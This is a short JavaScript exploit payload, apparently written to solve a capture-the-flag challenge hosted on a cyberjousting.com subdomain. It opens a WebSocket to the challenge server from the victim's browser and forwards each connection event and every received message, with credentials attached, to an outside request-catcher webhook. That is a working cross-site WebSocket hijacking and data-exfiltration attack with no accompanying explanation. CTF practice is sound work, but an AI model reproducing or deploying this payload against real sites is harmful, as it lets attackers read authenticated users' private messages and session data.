const WEBHOOK = "https://totototo.requestcatcher.com";

function webhook(domain = "", data = null) {
  let req = new XMLHttpRequest();
  req.open("POST", WEBHOOK + domain, false);
  req.withCredentials = true;
  req.send(data);
}

webhook("/init");

let socket;

// Initialize WebSocket connection
function initWebSocket() {
  socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");

  socket.onopen = () => {
    webhook("/onopen");
  };

  socket.onmessage = (event) => {
    // const messageData = JSON.parse(event.data);
    webhook("/onmessage", event.data);
  };

  socket.onclose = () => {
    webhook("/onclose");
  };

  socket.onerror = (error) => {
    webhook("/onerror", error);
  };
}

// Send message to the server and display it locally
function sendMessage(data) {
  // { sender: "user", message }
  socket.send(JSON.stringify(data));
}

// Initialize WebSocket connection on page load
initWebSocket();
sendMessage({ sender: "user", message: "toto" });
